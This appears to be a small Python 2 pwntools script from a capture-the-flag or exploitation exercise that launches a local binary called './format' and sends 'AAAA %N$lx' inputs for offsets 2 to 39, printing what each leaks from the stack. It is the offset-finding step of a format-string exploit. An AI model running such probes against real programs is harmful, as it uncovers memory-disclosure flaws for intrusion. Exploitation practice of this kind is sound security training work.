#!/usr/bin/env python2

from pwn import *

context.log_level = 'critical'
BINARY = './format'

for i in range(2, 40):
    p = process(BINARY)
    p.sendline('AAAA %{}$lx'.format(i))
    #p.recvline()
    print '%02d: '%(i) + p.recvline()[:-1]
    p.close()

print ''
